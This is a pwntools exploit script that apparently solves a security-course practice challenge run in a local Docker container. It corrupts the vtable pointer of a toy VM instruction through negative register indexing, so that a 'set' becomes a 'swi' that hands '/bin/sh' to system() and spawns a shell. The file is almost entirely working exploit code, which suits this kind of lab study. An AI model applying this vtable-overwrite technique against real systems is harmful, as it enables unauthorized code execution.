#!/usr/bin/env python3

import pwn
import socket
import threading

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-6')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")

port = 1024
conn = pwn.remote('127.0.0.1', port)

# wait for user input (in this time, connect gdb)
#pwn.pause()

# an SWI instruction has two ints
# an SET instruction has two ints
# => interpret SET at SWI
vtable_SET = 0x0000000000023718
vtable_SWI = 0x0000000000023768

# 4 registers:
# r0 r1 r2 r3
# we can also access negative ones r-1, r-100

# 6 instructions:
# add r0, r0, r1
# sub r0, r0, r1
# mul r0, r0, r1
# set r0, 100    <- set value
# dump           <- this prints r0,r1,r2,r3
# swi r0, r0     <- executes r0 (interprets r0 as string as command using system)

# 1) override vtable pointer of next instruction to swi
# 2) set r0, int(/bin/sh\x00) => gets executed

data = b'/bin/sh\x00'
target_int = pwn.u64(data)
lower_half = target_int % 2**32
upper_half = (target_int - lower_half) >> 32
print(f'{hex(target_int)} = {hex(upper_half)} | {hex(lower_half)}')

conn.sendline(f'set r0, {upper_half}'.encode())
conn.sendline(f'set r1, {2**16}'.encode())
conn.sendline(f'mul r0, r0, r1'.encode())
conn.sendline(f'mul r0, r0, r1'.encode())
conn.sendline(f'set r1, {lower_half}'.encode())
conn.sendline(f'add r0, r0, r1'.encode())
# r0 has now /bin/sh

# we need to do +80 on vtable 
vtable_dif = vtable_SWI - vtable_SET

# list code in gdb: list 100, 300
# set breakpoint before execution (break in c line 224): b 224 
# => now i can inspect heap
r0_at = 0x6295c8e846f0
table_set_at = 0x6295c8e84620
offset_to_set_swi = r0_at - table_set_at
offset_to_set_swi = offset_to_set_swi // 8
print(offset_to_set_swi)
conn.sendline(f'set r2, {vtable_dif}'.encode()) 
conn.sendline(f'add r-{offset_to_set_swi}, r-{offset_to_set_swi}, r2'.encode())
conn.sendline(b'dump')
conn.sendline(b'set r0, 0') # now a swi instruction
conn.sendline(b'dump')
conn.sendline()
# b 140 to check Swi
#b 124 to break at dump

# in theory only press enter and get shell
conn.interactive()
